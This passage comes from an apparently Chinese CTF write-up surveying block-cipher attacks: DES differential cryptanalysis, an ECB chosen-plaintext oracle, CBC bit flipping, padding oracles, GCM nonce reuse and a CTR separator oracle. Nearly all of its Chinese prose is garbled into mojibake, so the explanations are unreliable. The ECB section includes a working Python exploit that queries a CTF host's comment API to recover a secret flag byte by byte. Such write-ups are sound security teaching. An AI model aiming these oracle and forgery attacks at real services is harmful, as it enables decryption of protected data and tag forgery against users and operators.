·çš„é—®é¢˜ï¼Œæ‹¿å·®åˆ†æ”»å‡»è¦çš„æ˜å¯†æ–‡å¯¹æœ¬åœ°ç§’å‡ºï¼Œä½†æ˜¯dockeræŒ‚è½½é˜¿é‡Œäº‘ä»¥åå‘ç°å–$2^{12}$ä¸ªæ˜æ–‡å¯¹éƒ½è¦ä¸‰åˆ†é’Ÿ- -NM$L</p><p>äºæ˜¯version1çš„expå› ä¸ºæ¯æ®µè¦å–$2^{14}$ä¸ªæ˜æ–‡å¯¹ï¼Œåˆ†å››æ®µï¼ˆ$2^{16}$å¯¹ï¼‰ï¼Œæ”¹æˆäº†version2æ¯æ®µå–$2^{12}$ä¸ªæ˜æ–‡å¯¹ï¼Œåˆ†å…«æ®µï¼ˆ$2^{15}$å¯¹ï¼‰</p><p>Sboxä¹Ÿæ”¹æˆäº†æ ¹æœ¬å°±ä¸ç¬¦åˆSç›’å®šä¹‰çš„Sboxï¼Œå› ä¸ºå…¶å®æ˜¯ä¸å­˜åœ¨é’ˆå¯¹å•ä¸ªSç›’çš„äºŒè½®è¿­ä»£çš„ï¼ˆå› ä¸ºç”±Eæ‰©å±•å‡½æ•°çŸ¥ï¼Œè¯¥è¿­ä»£å·®åˆ†ç‰¹å¾è¦æ±‚è¾“å…¥å·®åˆ†ä¸º$00x_{1}x_{2}00$ï¼ˆå³æ˜æ–‡å¯¹å¤„äºåŒè¡Œï¼‰ï¼Œæ‰€ä»¥ä¸å¯èƒ½å­˜åœ¨æ»¡è¶³è¯¥å·®åˆ†è¾“å…¥çš„æ˜æ–‡å¯¹åŒæ—¶æ»¡è¶³å·®åˆ†è¾“å‡ºä¸º0ï¼‰</p><p>æ­ªæ—¥ï¼ŒğŸ‘´çœŸçš„åäº†ï¼Œversion1è¿œç¨‹expä¼°è®¡è¦è·‘å°†è¿‘1hï¼Œç›¸è¾ƒä¹‹ä¸‹version2çš„expå°†è¿‘30minï¼Œè¿˜ç®—èƒ½æ¥å—â€¦å§</p><p>è¿™é‡Œç»™å‡ºæˆ‘version1çš„æœ¬åœ°æµ‹è¯•expï¼Œå°±ä¸æ”¾WMCTFä¸Šçš„ç‰ˆæœ¬äº†ï¼ˆè¿™ä¸ªæ ¹æœ¬ç§°ä¸ä¸Šæ˜¯Sç›’çš„Sboxä¸€ç›´æœ‰ã€è†ˆåº”</p><p><a href="idiot box-version 1.ipynb">Click Here to Download idiot box-version 1</a></p><p>å†åšä¸‹expé‡Œä¸€äº›éƒ¨åˆ†çš„è§£é‡Šï¼š</p><ol><li><p>é’ˆå¯¹ç›¸é‚»ä¸¤ä¸ªSç›’çš„find_pathï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> max_pro &lt; <span class="number">192</span>: <span class="comment"># find suitable sbox</span></span><br></pre></td></tr></table></figure><p>è¦æ±‚max_pro &lt; 192çš„åŸå› æ˜¯è¦ä»¤S/Nè¶³å¤Ÿå¤§ï¼Œ$S/N\geq\frac{2^{12}(\frac{192}{64*64})^{2}}{4^{2}}\geq 0.5625$ï¼Œå› æ­¤å¯å°†cæš‚å–ä¸º40ï¼Œ$m=c/p\leq 40\frac{64^{4}}{192^{2}}\approx 18204$ï¼Œæ‰€ä»¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">2</span>**(<span class="number">4</span>*(right-left+<span class="number">1</span>)))):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">3</span>):</span><br><span class="line">     <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">3</span>):</span><br></pre></td></tr></table></figure><p>æ¯æ¬¡å–$2^{14}$ä¸ªæ˜æ–‡å¯¹ï¼Œå¹¶åŒæ—¶é€šè¿‡å¯†æ–‡å³åŠéƒ¨åˆ†å·®åˆ†è¿‡æ»¤é”™è¯¯å¯¹</p></li><li><p>å…³äºé€‰æ‹©æ˜æ–‡æ”»å‡»æ—¶æ˜æ–‡shiftçš„è§£é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i_shift = <span class="number">60</span> - right * <span class="number">4</span></span><br><span class="line">j_shift = (i_shift - <span class="number">3</span>) % <span class="number">32</span> + <span class="number">32</span></span><br><span class="line">k_shift = (i_shift + <span class="number">4</span> * (right - left + <span class="number">1</span>)) % <span class="number">32</span> + <span class="number">32</span></span><br></pre></td></tr></table></figure><p>é€‰å–çš„æ˜æ–‡å¯¹æ³¨æ„ä¸€å®šè¦æ¿€æ´»å·®åˆ†ç‰¹å¾ä¸Šçš„æ´»è·ƒSç›’</p></li><li><p>å¯†é’¥è®¡æ•°å™¨å¾—åˆ°çš„æœ€åä¸€è½®å€™é€‰å­å¯†é’¥å¯èƒ½å­˜åœ¨å¤šè§£ï¼ŒéªŒè¯æ ¡éªŒæ˜æ–‡å³å¯</p></li></ol><h3 id="æ»‘åŠ¨æ”»å‡»"><a href="#æ»‘åŠ¨æ”»å‡»" class="headerlink" title="æ»‘åŠ¨æ”»å‡»"></a>æ»‘åŠ¨æ”»å‡»</h3><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem"></a>Theorem</h4><p><a href="https://0xdktb.top/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/" target="_blank" rel="noopener">https://0xdktb.top/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/</a></p><p><a href="http://theamazingking.com/crypto-slide.php" target="_blank" rel="noopener">http://theamazingking.com/crypto-slide.php</a></p><h3 id="Group-Mode-ECB"><a href="#Group-Mode-ECB" class="headerlink" title="Group Mode(ECB)"></a>Group Mode(ECB)</h3><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem"></a>Theorem</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/ecb_encryption.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/ecb_decryption.png" alt></p><p>ä»¥iæ˜¥ç§‹2020å…¬ç›Šèµ›NewsWebsiteä¸ºä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;system.encrypt_key&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String signKey;</span><br><span class="line"><span class="meta">@Value</span>(<span class="string">"$&#123;system.flag&#125;"</span>)</span><br><span class="line"><span class="keyword">private</span> String sign;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">desEncrypt</span><span class="params">(String plainText)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  String cipher = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">byte</span>[] originPlainText = (plainText + System.currentTimeMillis() + <span class="keyword">this</span>.sign).getBytes();</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    TripleDesCipher tripleDesCipher = <span class="keyword">new</span> TripleDesCipher(<span class="keyword">this</span>.signKey.getBytes());</span><br><span class="line">    cipher = Base64.getEncoder().encodeToString(tripleDesCipher.encode(originPlainText));</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å…¶3DESæœ‰é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼Œä¸”plainTextå¯æ§ï¼Œè¿”å›çš„å¯†æ–‡ä¸º$E_{k}(plainText+System.currentTimeMillis()+flag)$</p><p>currentTimeMillisè¿”å›é•¿åº¦å›ºå®šï¼ˆé™¤éè¿æ°”æå·®ç¢°ä¸Šæœ€é«˜ä½è¿›ä½â€¦æƒ³peachï¼‰</p><p>ä¸”æœ‰<code>private static String TRIPLE_DES_TRANSFORMATION = &quot;DESede/ECB/PKCS5Padding&quot;</code>ï¼Œå› æ­¤æœ‰å¦‚ä¸‹æ”»å‡»æ–¹æ³•ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-12_16-28-03.png" alt></p><p>prefixå¡«å……<code>padding_length*&#39;a&#39;</code>åï¼Œæ°å¥½èƒ½ä½¿PKCS5åæœ€åä¸º<code>8*&#39;\x00&#39;</code></p><p>åŸºäº$8\mid(len(E_{k}(â€˜â€™+currentTimeMillis+flag))+padding_length)$</p><p>å¾—åˆ°crack_areaåˆ†ç»„å¯¹åº”å¯†æ–‡åï¼Œç”±äºcrack_areaæ˜æ–‡æ®µå7bitså‡å·²çŸ¥ï¼Œå› æ­¤send dataä¸ºçˆ†ç ´ä½+7å·²çŸ¥bitsï¼Œå½“è¿”å›çš„ct[:8]ä¸å‰è€…å»åˆæ—¶ï¼Œçˆ†ç ´å½“å‰æ¯”ç‰¹ä½æˆåŠŸ</p><p>åç»­æ¯”ç‰¹ä½å‡ç±»ä¼¼ï¼Œprefix++å¾—åˆ°æ–°çš„crack_areaå†…å®¹ï¼Œè¿›è€Œé€ä½çˆ†ç ´å³å¯</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">"http://dcf1d021-491b-4279-ae42-d56a10fc3334.node3.buuoj.cn/api//comment/news/28"</span></span><br><span class="line">url2 = <span class="string">"http://dcf1d021-491b-4279-ae42-d56a10fc3334.node3.buuoj.cn/api//comment/news/28?size=10&amp;page=0&amp;sort=commentId%2Cdesc"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">web_encrypt</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.post(url1, json=&#123;<span class="string">"commentEmail"</span>: <span class="string">"1@qq.com"</span>,</span><br><span class="line">                                  <span class="string">"commentContent"</span>: payload, <span class="string">"commentNickname"</span>: <span class="string">"0xDktb"</span>&#125;)</span><br><span class="line">    commentId = r.json()[<span class="string">'commentId'</span>]</span><br><span class="line">    r = requests.get(url2)</span><br><span class="line">    content = r.json()[<span class="string">'content'</span>]</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> _[<span class="string">'commentId'</span>] == commentId:</span><br><span class="line">            <span class="keyword">return</span> b64decode(_[<span class="string">'commentContent'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_padding_length</span><span class="params">()</span>:</span></span><br><span class="line">    origin_length = len(web_encrypt(<span class="string">''</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">        cur_length = len(web_encrypt(<span class="string">'a'</span> * i))</span><br><span class="line">        <span class="keyword">if</span> cur_length != origin_length:</span><br><span class="line">            <span class="keyword">return</span> (i, cur_length)  <span class="comment"># 8 | (len(enc(salt)) + i)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">(padding_length, crack_pos)</span>:</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">        crack_area = web_encrypt(</span><br><span class="line">            <span class="string">'a'</span> * (len(salt) + padding_length + <span class="number">1</span>))[crack_pos<span class="number">-8</span>:crack_pos]</span><br><span class="line">        <span class="keyword">if</span> len(salt) &gt;= <span class="number">7</span>:</span><br><span class="line">            payload = salt[:<span class="number">7</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload = salt + (<span class="number">7</span> - len(salt)) * chr(<span class="number">7</span> - len(salt))</span><br><span class="line">        isFound = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">            guess = web_encrypt(c + payload)[:<span class="number">8</span>]</span><br><span class="line">            <span class="keyword">if</span> guess == crack_area:</span><br><span class="line">                isFound = <span class="literal">True</span></span><br><span class="line">                salt = c + salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">assert</span>(isFound == <span class="literal">True</span>)</span><br><span class="line">        print(salt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    padding_length, crack_pos = crack_padding_length()</span><br><span class="line">    crack_salt(padding_length, crack_pos)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="Group-Mode-CBC"><a href="#Group-Mode-CBC" class="headerlink" title="Group Mode(CBC)"></a>Group Mode(CBC)</h3><h4 id="Theorem-4"><a href="#Theorem-4" class="headerlink" title="Theorem"></a>Theorem</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/cbc_encryption.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/cbc_decryption.png" alt></p><h5 id="CBC-Flipped-Ciphertext-Bits"><a href="#CBC-Flipped-Ciphertext-Bits" class="headerlink" title="CBC - Flipped Ciphertext Bits"></a>CBC - Flipped Ciphertext Bits</h5><p>å¯ä»¥çœ‹åˆ°CBCæ¨¡å¼ä¸‹ï¼Œä»»ä¸€åˆ†ç»„$C_{i}$çš„è§£å¯†ç»“æœï¼Œå‡åªä¸$C_{i}$å’Œ$C_{i-1}$æœ‰å…³ï¼ˆ$C_{1}$åªå’Œ$IV,C_{1}$æœ‰å…³ï¼‰</p><p>å› æ­¤åªéœ€ä»¤$C_{i-1}=C_{i-1}\oplus P_{i}\oplus (you\ want)$å³å¯ï¼ˆä»æœ€åä¸€å—å‘å‰ç¿»è½¬ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> os</span><br><span class="line">   ...: <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">   ...: key, iv = os.urandom(<span class="number">16</span>), os.urandom(<span class="number">16</span>)</span><br><span class="line">   ...: aes1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">   ...: aes2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: pt = <span class="string">b"0xDktb_wants_a_girlfriend_orzzzzzzzzzzzzzzzzzzzzzzzzzzzz"</span></span><br><span class="line">   ...: pad = <span class="keyword">lambda</span> x : (x + (<span class="number">16</span> - len(x) % <span class="number">16</span>) * bytes([<span class="number">16</span> - len(x) % <span class="number">16</span>]))</span><br><span class="line">   ...: pt = pad(pt)</span><br><span class="line">   ...: len(pt)</span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">64</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">   ...:     <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line">   ...: ct = aes1.encrypt(pt)</span><br><span class="line">   ...: payload = <span class="string">b"pt_1st_1s_H3r3!!pt_2nd_1s_H3r3!!pt_3rd_1s_H3r3!!pt_4th_1s_H3r3!!"</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">   ...:     ct_block = xor(xor(pt[<span class="number">16</span>*(<span class="number">3</span>-i):<span class="number">16</span>*(<span class="number">4</span>-i)], ct[<span class="number">16</span>*(<span class="number">2</span>-i):<span class="number">16</span>*(<span class="number">3</span>-i)]), payload[<span class="number">16</span>*(<span class="number">3</span>-i):<span class="number">16</span>*(<span class="number">4</span>-i)])</span><br><span class="line">   ...:     ct = ct[:<span class="number">16</span>*(<span class="number">2</span>-i)] + ct_block + ct[<span class="number">16</span>*(<span class="number">3</span>-i):]</span><br><span class="line">   ...:     dec_iv = ct[<span class="number">-16</span>:]</span><br><span class="line">   ...:     pt = aes2.decrypt(ct)</span><br><span class="line">   ...: dec_iv = xor(xor(pt[:<span class="number">16</span>], dec_iv), payload[:<span class="number">16</span>])</span><br><span class="line">   ...: aes3 = AES.new(key, AES.MODE_CBC, dec_iv)</span><br><span class="line">   ...: pt = aes3.decrypt(ct)</span><br><span class="line">   ...: print(pt)</span><br><span class="line"><span class="string">b'pt_1st_1s_H3r3!!pt_2nd_1s_H3r3!!pt_3rd_1s_H3r3!!pt_4th_1s_H3r3!!'</span></span><br></pre></td></tr></table></figure><h5 id="CBC-Chosen-Plaintext-Attack"><a href="#CBC-Chosen-Plaintext-Attack" class="headerlink" title="CBC - Chosen Plaintext Attack"></a>CBC - Chosen Plaintext Attack</h5><p><a href="https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/#Game" target="_blank" rel="noopener">https://0xdktb.top/2020/08/02/WriteUp-WMCTF2020-Crypto/#Game</a></p><h5 id="CBC-Padding-Oracle-Attack"><a href="#CBC-Padding-Oracle-Attack" class="headerlink" title="CBC - Padding Oracle Attack"></a>CBC - Padding Oracle Attack</h5><p>åœ¨æœåŠ¡å™¨æ£€æŸ¥è§£å¯†åˆæ³•æ€§ï¼Œä¸ºæ£€æŸ¥PKCS5-paddingçš„suffixéƒ¨åˆ†ï¼Œä¸”åˆæ³•ä¸éæ³•è¿”å›ä¸åŒçŠ¶æ€æ—¶ï¼ˆä¸è¿”å›æ˜æ–‡å†…å®¹ï¼‰ï¼Œå¯ä»¥é‡‡ç”¨Padding Oracle Attack</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-13_10-14-57.png" alt></p><h3 id="Group-Mode-GCM"><a href="#Group-Mode-GCM" class="headerlink" title="Group Mode(GCM)"></a>Group Mode(GCM)</h3><h4 id="Theorem0"><a href="#Theorem0" class="headerlink" title="Theorem0"></a>Theorem0</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-13_16-26-27.png" alt></p><p>å¯¹AES-GCMï¼Œæœ‰ä»¥ä¸‹<strong>ç¬¦å·å®šä¹‰</strong>ï¼š</p><p>$a|b$: a, bä½ä¸²çš„è¿æ¥ï¼›</p><p>$0^{s}$: é•¿åº¦ä¸ºsçš„0ä¸²</p><p>$A_{i}$: ç¬¬iå—çš„auth-data</p><p>$IV$: 96bits(12bytes)åˆå§‹å‘é‡</p><p>$cnt$: 4bytesè®¡æ•°å™¨counterå€¼ï¼Œ$cnt=(i+1)\%2^{32}$</p><p>$J_{i}$: ç¬¬iå—çš„Enc inputï¼Œ$J_{0}=IV||0^{31}||1$</p><p>$Gmul_{H}(X)$: $GF(2^{128})$ä¸Šçš„$H\cdot X$ï¼Œç´ å¤šé¡¹å¼$f=1+\alpha+\alpha^{2}+\alpha^{7}+\alpha^{128}$</p><p>å¯¹ç”Ÿæˆauth-tagçš„è¿‡ç¨‹æœ‰ï¼š</p><ul><li>$H=Enc_{k}(0^{128})$</li><li>$X_{0}=0$ï¼Œå‡è®¾Auth-dataå äº†mä¸ªblocké•¿åº¦ï¼Œ$X_{i}=Gmul_{H}(X_{i-1}\oplus A_{i})$,for $i\in\{1,..,m\}$</li><li>$X_{i+m}=Gmul_{H}(X_{i+m-1}\oplus C_{i})$,for $i\in\{1,â€¦,n\}$</li><li>$S=Gmul_{H}(X_{m+n}\oplus(len(A)||len(C)))$ï¼Œlen(A)å’Œlen(C)å‡ä¸ºé•¿åº¦64çš„ä½ä¸²ï¼ˆBLOCK_SIZE/2)</li><li>$T=S\oplus Enc_{k}(J_{0})$ï¼Œå³ä¸ºauth-tag</li></ul><p>GCMæœ€åè¿”å›çš„æ¶ˆæ¯ä¸º$C||T$.</p><h4 id="Theorem1-The-Forbidden-Attack"><a href="#Theorem1-The-Forbidden-Attack" class="headerlink" title="Theorem1 - The Forbidden Attack"></a>Theorem1 - The Forbidden Attack</h4><h5 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h5><p>TLSä¸‹çš„AES-GCMç”Ÿæˆçš„12bytes IVç”±ä»¥ä¸‹éƒ¨åˆ†ç»„æˆï¼š</p><ul><li>Salt(4 bytes)ï¼šç”±TLS handshakeï¼Œå€¼ç­‰äºserver_write_IV / client_write_IVï¼Œå±äºIVçš„implicit part</li><li>Nonce(8 bytes)ï¼šæœåŠ¡å™¨éšæœºç”Ÿæˆï¼Œå±äºIVçš„explicit part</li></ul><p>$g(X)=A_{1}X^{m+n+1}+â€¦+A_{m}X^{n+2}+C_{1}X^{n+1}+â€¦+C_{n}X^{2}+LX+Enc_{k}(J_{0})$</p><p>(å…¶ä¸­$L=(len(A)||len(C))$)</p><p>$g(H)=T$</p><p>æˆ‘ä»¬çš„æ”»å‡»ä¸»è¦åŸºäºå·²æ‰¾åˆ°Nonceç›¸åŒçš„ä¸€å¯¹collisionï¼ˆåŒä¸€ä¼šè¯ä¸‹Saltä¸å˜ï¼‰ï¼Œåˆ™æœ‰</p><p>å‡è®¾$m=0,n=1$ï¼Œ</p><p>$g_{1}(X)=C_{1,1}X^{2}+L_{1}X+Enc_{k}(J_{0})$</p><p>$g_{2}(X)=C_{2,1}X^{2}+L_{2}X+Enc_{k}(J_{0})$</p><p>ä¸”$g_{1}(H)=T_{1},g_{2}(H)=T_{2}$</p><p>$\therefore(C_{1,1}+C_{2,1})H^{2}+(L_{1}+L_{2})H+T_{1}+T_{2}=0$. (ç³»æ•°å‡å·²çŸ¥)</p><p>æ•…candidate Håœ¨ä¸Šè¿°æ–¹ç¨‹çš„rootsä¸­ï¼Œè€Œrootsæ€»æ•°ä¸€èˆ¬ä¸æ–¹ç¨‹degreeç›¸åŒï¼Œä¸”ç°å®ä¸­degreeå¹¶ä¸ä¼šè¿‡å¤§ï¼ˆæ¶ˆæ¯æé•¿é™¤å¤–ï¼‰ï¼Œå› æ­¤åœ¨å‘ç”Ÿnonce collisionæ—¶ï¼ŒHçš„å€¼å°±èƒ½è¢«æ”»å‡»</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-08-16_23-39-32.png" alt></p><p>æœ‰äº†Hå°±æ„å‘³ç€æˆ‘ä»¬èƒ½è‡ªç”Ÿæˆåˆæ³•auth-tag</p><p>æ”»å‡»åœºæ™¯å®ä¾‹ï¼š</p><blockquote><p>æœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é—´ä»¥AES/GCMè¿›è¡Œé€šä¿¡ï¼Œ<strong>AESå¯†é’¥åŠ4bytesçš„Salt</strong>åŒæ–¹åœ¨é€šè¿‡å¯†é’¥åå•†åè®®åå„è‡ªä¿å­˜åœ¨æœ¬åœ°ï¼ˆç¬¬ä¸‰æ–¹æ— æ³•è·å–ï¼‰</p><p>åœ¨æ­£å¸¸é€šä¿¡æ—¶ï¼Œä¼ è¾“çš„ä¸º<strong>cipher &amp; auth-tag T &amp; Nonce(8 bytes)</strong>ï¼Œå¯è¢«ç¬¬ä¸‰æ–¹æˆªå–</p><p>åˆ™è‹¥æˆ‘ä»¬é€šè¿‡ä¸Šè¿°æ–¹æ³•æ”»ç ´Hï¼Œåˆæœ‰<strong>å·²çŸ¥æ˜æ–‡æ”»å‡»çš„Oracle</strong>ï¼Œå³å¯é€šè¿‡å·²çŸ¥æ˜æ–‡çš„ä¸€ç»„æ•°æ®è¿›è¡Œå¯†æ–‡ç¯¡æ”¹å¹¶è‡ªç”Ÿæˆåˆæ³•auth-tagï¼Œå®ç°å¯¹æœåŠ¡å™¨çš„æ¬ºéª—</p></blockquote><h3 id="Group-Mode-CTR"><a href="#Group-Mode-CTR" class="headerlink" title="Group Mode(CTR)"></a>Group Mode(CTR)</h3><h4 id="Theorem0-1"><a href="#Theorem0-1" class="headerlink" title="Theorem0"></a>Theorem0</h4><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/1920px-CTR_encryption_2.svg.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/1920px-CTR_decryption_2.svg.png" alt></p><p>$C_j=E_k(nonce_j)\oplus P_j$</p><p>$P_j=E_k(nonce_j)\oplus C_{j}$</p><h4 id="Theorem1-Separator-Oracle"><a href="#Theorem1-Separator-Oracle" class="headerlink" title="Theorem1 -  Separator Oracle"></a>Theorem1 -  Separator Oracle</h4><p>å‡è®¾æ˜æ–‡æ ¼å¼ä¸º$username||timestamp||userlevel$</p><p>Separator Oracleèƒ½åº”ç”¨çš„åœºæ™¯å¤§è‡´ä¸ºï¼š</p><p>æ™®é€šç”¨æˆ·æ³¨å†Œåï¼ŒæœåŠ¡å™¨ç»™å‡ºå…¶$username||timestamp||userlevel$é€šè¿‡CTRåŠ å¯†ç”Ÿæˆçš„tokenï¼Œä¿æŒä½œsessionid</p><p>åœ¨å‘èµ·ç™»é™†è¯·æ±‚æ—¶ï¼ŒæœåŠ¡ç«¯è§£å¯†sessionidåè‹¥ä¸æˆåŠŸä¼šæ ¹æ®å…·ä½“æƒ…å†µè¿”å›ä¸ç”¨Exception</p><p>æˆ‘ä»¬ä¸»è¦åˆ©ç”¨çš„ä¸ºseparateé”™è¯¯å¼•èµ·çš„ErroræŠ›å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">separator = <span class="string">'|'</span></span><br><span class="line">ct = get_cookie(<span class="string">'sessionid'</span>)</span><br><span class="line">pt = decrypt(ct)</span><br><span class="line">pt = pt.split(separator)</span><br><span class="line"><span class="keyword">if</span> len(pt) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">"Separate failed."</span>)</span><br></pre></td></tr></table></figure><p>æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pt = [<span class="number">0</span>] * len(ct)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ct)):</span><br><span class="line">    new_ct1 = ct[:i] + bytes([ct[i] ^ <span class="number">1</span>]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">    new_ct2 = ct[:i] + bytes([ct[i] 